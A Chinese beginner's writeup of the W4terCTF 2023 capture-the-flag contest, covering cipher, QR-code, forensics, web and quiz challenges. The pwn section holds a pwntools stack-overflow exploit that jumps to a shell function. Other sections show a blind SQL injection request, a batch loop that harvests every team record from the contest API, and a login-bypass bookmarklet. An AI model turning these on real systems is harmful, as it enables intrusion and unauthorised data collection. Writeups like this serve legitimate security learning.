---
title: 梦开始的地方：W4terCTF 2023 Writeup by 打新手赛打的
description: 一个懵懂的年轻人参加的第一场 CTF。
date: 2023-04-14
updated: 2023-04-14
categories: [ctf-writeups]
cover: ../../assets/content/ctf-writeups/w4terctf-2023/cover.webp
---

这是一个懵懂的年轻人参加的第一场 CTF，Writeup 基本没有改动。

![](../../assets/content/ctf-writeups/w4terctf-2023/result.png)

# Misc

## Check in

公众号（https://mp.weixin.qq.com/s/g-nS4wYxq_YCGUoL8P3WTw ）：`W4terCTF{weIC0Me_tO_`

赛事详情页（https://ctf.w4terdr0p.team/games/1 ）：`th3_4m4z1n6_`（被网页样式隐藏，F12来一下）

QQ群公告：`W0rId_o1_CTF}`

![](../../assets/content/ctf-writeups/w4terctf-2023/1.png)

🚩 `W4terCTF{weIC0Me_tO_th3_4m4z1n6_W0rId_o1_CTF}`

## Weird Letter

```plaintext
Pqrb HWYif,

    I qiiz gxue doxvtks frhwn leg ivvq dgh hhjn rjh'hq qettbbru tqy xspyfqdosw hj QTO wavybqzxox. Dl ccu thhr, phkbkyluttvy rm t xekourv hrftcnnhm js cmzp MYI vloluygbri, mzu sy'v bqdoantig ja trfj d zscd dhwzeifmennqz st tqy wdsvqdvxy hggfyynbja jqoyxntnig tqum veu gevn.

    Nq vposbcv xeobffqwdilm, tqy Odtuzqio fqw Goebuk xvftqic fux tcpdftm pxautox. Wai Jipygzeu ougrju bw o pxfrvyftmsoylv wibbnbohjuae mnsaif tqum pfue m iouhtxwnp extjedp ky jqvmdhnl ignyzfvhy pxwgapyl. Dg'i m bfgjuyyz ewwktcjuae dtre, fit rn vva rq oikhnxh isrhz aeucgvxhb trolhmbn. Gxq Oroxdk gwpqyk df q eudzqhk wibbnbohjuae mnsaif tqum nuyrfj offa pstcyk da jtq gvflgxsxc vr v syjqu xzpuif oo jhnvjuaec irpr hhn uekuqnqk. Wtgxvb casiobwdmgrd ryjsrb ghmr qphrxhhw ibcasiovez fvmmqbuieb mnxu qe fyo Fgoebcnx Xiphkbkstq Lxonmuky (NUE). MVC nv t wmmvymmvs qztbdsmmcn jfzjeyftd dmdm ygeb u dzl ja qemwbix onm xxxeobf ukyd. Bx'g dnmbbaup ff bjvbwh acntxxi rdfw jyxr hhn ghng qphrxhhw gcmyomzei mzu sx zbhslh olzq ja qemwbix gewmbovlq prdf. Dlcamnnkdp uzoiiuwbsb ib ugjgxqd zwurkxonc ygxeobfzys wxgvnrknz gxmf'j exhw mb CCZ vcnbxqeqjv. Twmmvymmvs qztbdsmmcn dmxn gma wvix, d iyplrw dzl qzp r zwloehe tyr, ob uzoiiuw trr dnwktcj pmkk. Nw'l gcmviggl kequ ss gbkwtjf ldtdmflbjv trr snwnmr saydeslvehixh imbjaofvx.

    Lg gcnlfnnvez, oiiuwhkfaybr df q rmjmnqtxwnp ugy pxmxcosjbru sdvczpj ftrd'x fkmhilue ob SFR trfoeibgnm. Pcrjtqi itx'ki bef nh XGV ad rx jaiifinhvzq SFRvb, zqwifscugyvds fyo ilyjsrnhm zasdkgdnrg xscqhblhue uj oxvxrhijf mj fkoovoi lg xveby vcnbxqeqjv. Disp nrigbhuzx ksg aeje oog xeqowzxl wasge lcicrhe!

    Kfew ieeu ib Q4mzeSFR fzjq uvocn OGmNLqx lxihkpwnn naZ hdpqivnqx wsCA37 ogyrhxueo GXKpSd dhwzebuzv sS xghsrucgz sHq9G3emd fesge kltxr.

Rqek bjjtvrs,
Ml. 0i
```

### 解题过程

观察密文，有几处出现`xxx'x`，猜测是英文单词等长变换而来；

只有一个字母的单词（`a`/`I`）变成了不同的字母，猜测是维吉尼亚密码（Vigenere）。

![](../../assets/content/ctf-writeups/w4terctf-2023/2.png)

在不知道密钥长度的情况下，使用在线工具（https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx ）解密：

![](../../assets/content/ctf-writeups/w4terctf-2023/3.png)

在线工具认为密钥长度为96，解密后的“明文”有部分内容与正确的明文较接近。观察所用的密钥，几乎是16个字符被重复6次。于是调整密钥长度为16，再次使用在线工具（https://www.guballa.de/vigenere-solver ）解密：

![](../../assets/content/ctf-writeups/w4terctf-2023/4.png)

此时得到了正确的密钥、明文和flag。

🚩 `W4terCTF{UNrAVel_thE_seCR37_BURlEd_iN_fRe9U3ncy}`

## Good QRCode

![](../../assets/content/ctf-writeups/w4terctf-2023/5.png)

### 解题过程

首先发现**不同实例**给出的二维码除“格式信息”（Format Information，下图蓝色区域）不相同外，其余部分均相同。于是猜测，只是把正常二维码的格式信息改乱了，所以无法识别。

![](../../assets/content/ctf-writeups/w4terctf-2023/6.png)

![](../../assets/content/ctf-writeups/w4terctf-2023/7.png)

二维码有复杂的纠错机制，但是对于格式信息和版本信息，仅仅采用了重复两遍的方法防止错误。“格式信息对不上就无法识别”是成立的，可以尝试扫下面的二维码（正常生成左边，然后改出右边）：

![](../../assets/content/ctf-writeups/w4terctf-2023/8.png)

格式信息只有32种（https://www.thonky.com/qr-code-tutorial/format-version-tables ），可以手动逐一尝试🤡。可以通过Windows画图的填充工具和Ctrl+Z，快速对下图进行操作。

![](../../assets/content/ctf-writeups/w4terctf-2023/9.png)

手动尝试32次都扫不出来，说明**本题不适用上述方法**，现在请忘掉上面的做法。😜

题目上的提示是后来补上的。生成二维码的步骤：https://www.bilibili.com/read/cv684169 ，现在已经得到一个像模像样的二维码，差的就是掩码这一步了。

掩码有8种，这可不是孔乙己，而是为了避免出现大片黑/白或者类似“码眼”的结构。但实际上，使用了任何一种掩码，只要格式信息对得上，都是可以被正确识别的。

![](../../assets/content/ctf-writeups/w4terctf-2023/10.png)

于是现在有两种做法：一是直接把二维码内容读出来；二是继续加上掩码然后再识别。你选哪种？

我选第二种，并且采用0号掩码，因为好算。

我不会写Python，但是看了Bad QRCode题目的附件，又觉得PIL库很好用。以下程序是用Cursor软件写的，这个编辑器里面可以直接用GPT：

```python
from PIL import Image

img = Image.open('qrcode.png')

arr = [[0 for _ in range(61)] for _ in range(61)]

def isFunctionRegion(x,y):
    if (x==6) or (y==6) or (x<=8 and y<=8) or (x>=50 and y<=6) or (y>=50 and x<=6) or (x>=53 and y==7) or (y>=53 and x==7):
        return True
    else:
        return False

# read source image
for x in range(61):
    for y in range(61):
        if img.getpixel((x*13+33, y*13+33)) == 0:
            arr[x][y] = 0
        else:
            arr[x][y] = 255
        # mask
        if (isFunctionRegion(x,y)==False) and ((x%2==0 and y%2==0) or (x%2==1 and y%2==1)):
            arr[x][y] = 255 - arr[x][y]

# format information 001011010001001 这里的第一维x向右为正 第二维y向下为正
arr[0][8]=arr[1][8]=arr[3][8]=arr[7][8]=arr[8][7]=arr[8][5]=arr[8][4]=arr[8][2]=arr[8][1]=arr[8][60]=arr[8][59]=arr[8][57]=arr[8][54]=arr[59][8]=arr[58][8]=arr[56][8]=arr[55][8]=arr[54][8]=255
arr[2][8]=arr[4][8]=arr[5][8]=arr[8][8]=arr[8][3]=arr[8][0]=arr[8][58]=arr[8][56]=arr[8][55]=arr[60][8]=arr[57][8]=arr[53][8]=0

# Create a new 1-bit image
img = Image.new('1', (845, 845))

# Iterate through the array and set the corresponding pixel in the image
for y in range(61):
    for x in range(61):
        for a in range(13):
            for b in range(13):
                img.putpixel((x*13+a+26, y*13+b+26), arr[x][y])

# border
for x in range(845):
    for y in range(845):
        if x<26 or x>=845-26 or y<26 or y>=845-26:
            img.putpixel((x, y), 255)

img.save('output.png')
```

二维码内容每个码元（小方块）用1个布尔值表示，1为黑色，0为白色。原图像每个像素用1个整数表示，取值为0~255，0为黑色，255为白色。（而RGB用3个整数，RGBA（含不透明度）用4个整数。）

在进行0号掩码时，对应x和y奇偶性相同的小方块用反码（即与黑1异或），相反的小方块用原码（即与白0异或）。反码操作直接写成被255减：255-0=255，255-255=0。

功能区域不进行掩码，“小码眼”属于功能区域，本来不应该添加掩码。但我懒得再写判断条件，反正加上掩码之后也能识别出来。

程序输出：

![](../../assets/content/ctf-writeups/w4terctf-2023/11.png)

🚩 `W4terCTF{gOOD_dEcoDeR_caN_rEad_nakEd_Qr-cod3_WItHouT_mAsK}`

## Shadow

### 解题过程

上nc，把内容保存为文件。

```bash
nc ctf.w4terdr0p.team 8888 -o shadow.txt
```

![](../../assets/content/ctf-writeups/w4terctf-2023/12.png)

然后就可以看到隐藏的flag了。

![](../../assets/content/ctf-writeups/w4terctf-2023/13.png)

🚩 `W4terCTF{sHAD0W_IN_thE_LiGHT_fAUI7_iN_7hE_R19HT}`

## Spam 2023

![](../../assets/content/ctf-writeups/w4terctf-2023/14.png)

### 解题过程

~~密文似乎说来说去都是那几句话，~~ 所以取密文中的一句话`We are a BBB member in good standing`进行百度搜索，找到了类似的内容，及加/解密方式：[https://spammimic.com/](https://spammimic.com/)

从Dear Colleague开始复制，spammimic解密结果：

```plaintext
26dp26dp58PA5eC(9NY5494#-dP$5eT'4%3d980638p&6%j44&0&5&P+08P@99*&@&*24dBh8891@M9C4c9549*%0NP'8d&1@P4+9dG"4NjB9&T24&C&5&K60P9"0P&)0%**0N3b08j64%Nd4$GC5!
```

![](../../assets/content/ctf-writeups/w4terctf-2023/15.png)

长度为150字符，特征是含有较多的特殊字符`@!"#$%&'()*+-`，较少的小写字母（只出现了c d e h j p）。由提示可知是BinHex编码，文档：http://files.stairways.com/other/binhex-40-specs-info.txt

尝试对前4个字符`26dp`进行解码：

![](../../assets/content/ctf-writeups/w4terctf-2023/16.png)

恰好得到3个`00111101`，也就是ASCII的`=`。

1个26dp对应3个=，2个26dp对应6个=，6个=明显是base32的特征。

写一个C程序完成后续解码，并前后翻转（因为base32的6个=在末尾）：

```c
#include<stdio.h>
#include<string.h>

int main() {

    char ind[200] = {0}; // 存放逐个字符的BinHex索引
    char convert[200] = {0}; // 存放解码后的字符串
    char reverse[200] = {0}; // 将解码后的字符串前后翻转

    char* key = "!\"#$%&'()*+,-012345689@ABCDEFGHIJKLMNPQRSTUVXYZ[`abcdefhijklmpqr";
    char* code = "26dp26dp58PA5eC(9NY5494#-dP$5eT'4%3d980638p&6%j44&0&5&P+08P@99*&@&*24dBh8891@M9C4c9549*%0NP'8d&1@P4+9dG\"4NjB9&T24&C&5&K60P9\"0P&)0%**0N3b08j64%Nd4$GC5!";

    // 填充ind
    int i=0;
    while(code[i]) {
        ind[i] = strchr(key,code[i]) - key;
        i++;
    }

    // 填充convert
    for(int j=0; j<=50; j++) {
        int x = j * 3;
        int y = j * 4;
        convert[x] = (ind[y]<<2) + (ind[y+1]>>4);
        convert[x+1] = (ind[y+1]<<4) + (ind[y+2]>>2);
        convert[x+2] = (ind[y+2]<<6) + (ind[y+3]);
    }

    // 填充reverse
    int len = strlen(convert);
    for(int i=len-1; i>=0; i--) {
        reverse[i] = convert[len-1-i];
    }

    puts(reverse);
    return 0;
}
```

程序输出：

```plaintext
HY7D4IDSN52D6IB4HQ6AU6SXHEVDOZTXNFAGWJTZNASFI6DRER5GY5ZNEQ7FGORXERUVI5JYHESDQNLEOASCU4DDFZKCI3BTERKVGVKWII======
```

然后base32解密得到：

```plaintext
>>> rot? <<<zW9*7fwi@k&yh$Txq$zlw-$>S:7$iTu89$85dp$*pc.T$l3$USUVB
```

第二行是ROT（旋转）加密，但不知道旋转位数（偏移量）。尝试对ASCII使用不同的偏移量，偏移量为59时得到flag。

![](../../assets/content/ctf-writeups/w4terctf-2023/17.png)

依次进行了spam、BinHex、base32、ROT59四次解密。

~~对于这道题，我的评价是：买（sang）壹（xin）送（bing）叁（kuang）~~

🚩 `W4terCTF{HaVE_1UN_WITh_y0ur_F1Rst_spAM_eM@i1_In_2023}`

# Pwn

## What is NetCat

（题面链接：[netcat的使用 - Lmg66 - 博客园](https://www.cnblogs.com/Lmg66/p/13811636.html)）

![](../../assets/content/ctf-writeups/w4terctf-2023/18.png)

🚩 `W4terCTF{WeIComE_TO_tHe_tHrlIIln9_GAmE}`

## Tic-Tac-Toe Level 0

解题脚本：

```python
from pwn import *
c=remote("ctf.w4terdr0p.team",8888)
for i in range(8):
    c.recvline()
c.sendline("4")
for i in range(15):
    c.recvline()
c.sendline("5")
for i in range(15):
    c.recvline()
c.sendline("3")
c.recvline()
c.recvline()
c.send('a' * 0x14 + 'bbbb')
c.sendline(p32(0x08049236))
c.sendline("cat flag")
c.interactive()
```

题目和[栈溢出原理 - CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/)基本一致，这里就不复制粘贴一遍了。

用IDA反编译附件，在字符串视图可以看到`"/bin/sh"`，找到使用该字符串的函数是`success`，目标地址是`0x08049236`，如下图。

![](../../assets/content/ctf-writeups/w4terctf-2023/19.png)

找到可以造成栈溢出的函数，确定需要填充字符（字节）的长度为14，如下图。所以输入是`'a' * 0x14 + 'bbbb' + p32(0x08049236)`。

![](../../assets/content/ctf-writeups/w4terctf-2023/20.png)

需要在井字棋游戏中获胜，程序运行到输入名字。经过几轮正常游戏，总结规律写出上文的Python程序，运行得到flag。

![](../../assets/content/ctf-writeups/w4terctf-2023/21.png)

🚩 `W4terCTF{IE7'S_pLaY_wlth_yOuR_1IRSt_PwNlNg_cH4lleNg3_of_7Ic-7aC-70e}`

# Web

## The Moment of Token

### 解题过程

根据注释，要让当前时间戳与密码的整数距离小于5。

![](../../assets/content/ctf-writeups/w4terctf-2023/22.png)

于是写一行JavaScript放在浏览器书签（我的QQ浏览器好像不能直接在地址栏输入这行JavaScript来运行），F12给表单加上id，点击书签，以便登录成功：

![](../../assets/content/ctf-writeups/w4terctf-2023/23.png)

```javascript
javascript:document.getElementById("password").value=String((new Date()).valueOf());document.getElementById("aaa").submit();
```

![](../../assets/content/ctf-writeups/w4terctf-2023/24.png)

登录前后，使用Fiddler抓包，在Cookies处看到“转瞬即逝”（前面和后面都没有出现）的token：

![](../../assets/content/ctf-writeups/w4terctf-2023/25.png)

```plaintext
token=eyJhbGciOiJIUzI1NiJ9.eyJnaWZ0IjoiSzQySElaTFNJTktFTTZaWEpCU1Y2VExQTlVaVzRWQzdONVRGNk5aUU5OQ1c0WFpSS05QVU1NS0ZJVjJHU1RSV0w1UkZLVkM3S0JaRUtRMkpKNTJUSzdJPSIsInVzZXJuYW1lIjoiIn0.P2HVls2s53LWvCP5F_dHepbvjalwJswZ2aBk8pMdJEo
```

使用[https://cyberchef.org](https://cyberchef.org/)，**自动识别**加密方式并解密（进行两次），优雅地得到flag：

![](../../assets/content/ctf-writeups/w4terctf-2023/26.png)

![](../../assets/content/ctf-writeups/w4terctf-2023/27.png)

🚩 `W4terCTF{7He_Mom3nT_of_70kEn_1S_F1EEtiN6_bUT_PrECIOu5}`

# Reverse

## Lazy Puts

~~都来打CTF了，我甚至还没有装过Linux~~

无所谓，十六进制编辑器（如010 Editor，WinHex等）会出手🐶

![](../../assets/content/ctf-writeups/w4terctf-2023/29.png)

🚩 `W4terCTF{1'll_tEll_y0U_THe_TrUTH_WHen_I_wAke_up}`

# Forensics

## USB Hacker

### 解题过程

用WireShark打开附件，逐条数据查看Leftover Capture Data。

![](../../assets/content/ctf-writeups/w4terctf-2023/30.png)

第一个字节为`02`或`20`表示Shift被按下，第三个字节按照映射表转换可得到输入的字符。

映射表：https://usb.org/sites/default/files/documents/hut1_12v2.pdf ，第53页。

有两点需要注意（网上的一些脚本就没有注意，导致答案错误）：

1. 一般情况下Shift和其他键不是同时松开（弹起）的。如果先松开的是Shift，有可能识别错误。

![](../../assets/content/ctf-writeups/w4terctf-2023/31.png)

1. Caps Lock只对26个字母产生影响。

![](../../assets/content/ctf-writeups/w4terctf-2023/32.png)

最后还是人工转换完了全部数据。

![](../../assets/content/ctf-writeups/w4terctf-2023/33.jpg)

🚩 `W4terCTF{yoU_@R3_Th3_MaST3R_o1_USB_tR@Ff!C_aN@Iys!s}`

## 紧急求助

![](../../assets/content/ctf-writeups/w4terctf-2023/34.png)

### 解题过程

打开截图工具摇晃鼠标，可以发现大部分位置都是纯白（255）的，有少数位置是253和254，这些位置就有水印。

![](../../assets/content/ctf-writeups/w4terctf-2023/35.png)

用图片处理软件，调高亮度（对于题目中深色模式下的图片）就可以看到水印了。（插入一条软件推荐：一个安卓版的图片处理软件“Snapseed”，非常简洁，并且可以进行很多操作）

![](../../assets/content/ctf-writeups/w4terctf-2023/36.jpg)

不懂怎么找API，但是对比赛页面（题目、排行榜、自己的队伍……）F12→网络能看到几个项目，打开来看看。

![](../../assets/content/ctf-writeups/w4terctf-2023/37.png)

![](../../assets/content/ctf-writeups/w4terctf-2023/38.png)

实现手机看排行榜自由（不是）

上面还有个落单的js，打开发现有`/api`字符串。

![](../../assets/content/ctf-writeups/w4terctf-2023/39.png)

![](../../assets/content/ctf-writeups/w4terctf-2023/40.png)

有好几个`/api/team`，看得眼花（注：复制到VS Code可以Shift+Alt+F整理格式），直接浏览器打开。

![](../../assets/content/ctf-writeups/w4terctf-2023/41.png)

发现是自己队，里面出现了与水印相似的“8-4-4-4-12”结构字符串。自己队id是49，前面看到`/api/team/${n}`，在地址后面加个数字试试。

![](../../assets/content/ctf-writeups/w4terctf-2023/42.png)

是50号队。（应该有可以看到全部队伍的api吧？但我没去找了。）

换成不同的数字，于是知道了范围是1~106（我做题时）。

![](../../assets/content/ctf-writeups/w4terctf-2023/43.png)

一个个队看太不划算，写一个批处理脚本，把这些数据全下载到本地。（Windows下的，粘贴到记事本保存为.bat文件，双击即可运行）

```bash
@echo off
set count=1
:loop
if %count%==107 goto end
curl https://ctf.w4terdr0p.team/api/team/%count% -o %count%.txt
set /a count+=1
goto loop
:end
echo "Loop finished"
pause
```

运行后，会在脚本相同文件夹下得到106个txt文件。这样就可以用AnyTXT来快速查找了。

![](../../assets/content/ctf-writeups/w4terctf-2023/44.png)

![](../../assets/content/ctf-writeups/w4terctf-2023/45.png)

🚩 `W4terCTF{WE_HAVe_b4NN3d_7Hi5_USer!_thAnK_Y0U_1Or_YOUR_H3lp!}`

## Evil Traffic

### 解题过程

一个教程（[HTTP - CTF Wiki](https://ctf-wiki.org/misc/traffic/protocols/http/)）说用终端命令把URL提取出来。

```bash
tshark -r evil.pcapng.gz -T fields -e http.request.full_uri > eviltraffic.txt
```

![](../../assets/content/ctf-writeups/w4terctf-2023/46.png)

URL解码（[URL解码 URL编码 在线URL解码/编码工具 iP138在线工具](https://tool.ip138.com/urlencode/)）一下，把%转义的字符译出来，方便看。用WPS文字删去空行。

![](../../assets/content/ctf-writeups/w4terctf-2023/47.png)

保留有flag字样的行，用Excel的分列功能取出有用的数据。（按`>`分列，然后用空白替换掉`CHAR(`和`)`）

![](../../assets/content/ctf-writeups/w4terctf-2023/48.png)

塞进去一个ASCII映射表，Excel公式把ASCII转换为对应的字符。看到了flag特征的`{`

![](../../assets/content/ctf-writeups/w4terctf-2023/49.png)

找到flag的开头（W4ter）。会发现flag在

`http://10.37.129.2:60080/?id=1 AND SUBSTR((SELECT COALESCE(flag,CHAR(32)) FROM flag LIMIT 1,1),XXX,1)`，每个XXX对应一个字符。

![](../../assets/content/ctf-writeups/w4terctf-2023/50.png)

再找另一个教程（[某行业攻防培训-----流量分析之-----sql盲注_sql盲注流量分析-CSDN博客](https://blog.csdn.net/qq_45555226/article/details/102809032)），去WireShark过滤出http。

![](../../assets/content/ctf-writeups/w4terctf-2023/51.png)

定位到flag出现的范围。观察发现W4ter这些字符对应的响应都是nothing here。

所以，对于上文的每个XXX，找到ASCII最小的nothing here，把ASCII翻译成字符，拼起来就是想要的flag。原因用下图举例，当初注入的时候尝试112，是nothing here，说明正确的小于等于112。继续尝试104是nothing here，说明正确的小于等于104。继续尝试100,98,99，直到能判断出最小的nothing here是多少。

![](../../assets/content/ctf-writeups/w4terctf-2023/52.png)

电脑在看WireShark，屏幕不够用，手写比较有效率。第一行是第几个字符（跳过`W4terCTF{`），第二行是得到的十进制ASCII，第三行是对应的字符。

![](../../assets/content/ctf-writeups/w4terctf-2023/53.png)

🚩 `W4terCTF{Wow_Y0u_cR@CK3D_A_5&L_6l!nd_!nJEC7I0n_1L0W}`

# PPC

## Quiz for PyGZ

![](../../assets/content/ctf-writeups/w4terctf-2023/54.png)

前2题略，第3题在网上找现成的答案https://www.zhihu.com/question/345195246/answer/832881914 ，第4题也是网上找的，但是想知道是怎么回事（不觉得这很神奇吗？），于是询问了GPT（是GPT-3，下面已经把他说错的部分更正了）。

> 这是一个Python程序，它定义了一个字符串变量\_，它的值是'\_=%r;print(\_%%\_)'，其中%r是一个占位符，表示将来会被替换成一个字符串。然后程序使用print函数输出了这个字符串，字符串中的%r被替换成了_本身，所以输出的结果就是"\_='\_=%r;print(\_%%\_)';print(\_%\_)"。这个程序的作用是输出自身的代码。

然后我对它作了一点修改，就得到了第5题的答案。

```python
Welcome to the quiz for PyGZ!
In following questions, you will be asked to write some one-line answers.
[+] Question 1
    Write a python program that prints "Hello World!"

[-] Answer: print("Hello World!")
[+] Output: Hello World!
[+] Question 2
    Write a python program that prints the answer to the life, the universe, and everything

[-] Answer: print(42)
[+] Output: 42
[+] Question 3
    Give me three numbers so they satisfy x^3 + y^3 + z^3 is the answer to the previous question (split by space)

[-] Answer: -80538738812075974 80435758145817515 12602123297335631
[+] Question 4
    Write a python program that prints its own source code

[-] Answer: _='_=%r;print(_%%_)';print(_%_)
[+] Output: _='_=%r;print(_%%_)';print(_%_)
[+] Question 5
    Write a python program that prints its own sha256 hash

[-] Answer: import hashlib;_='import hashlib;_=%r;print(hashlib.sha256((_%%_).encode()).hexdigest())';print(hashlib.sha256((_%_).encode()).hexdigest())
[+] Output: bdc6cc2d96856f78ae8b29353bf441a998080054a08f6ef2f67ab98b32d7599e

[+] Congratulations! You have passed all the questions in the PyGZ quiz!
[+] Here is your flag: W4terCTF{yOU_ScoREd_l0OPT5_frOM_9Z7im3}
```
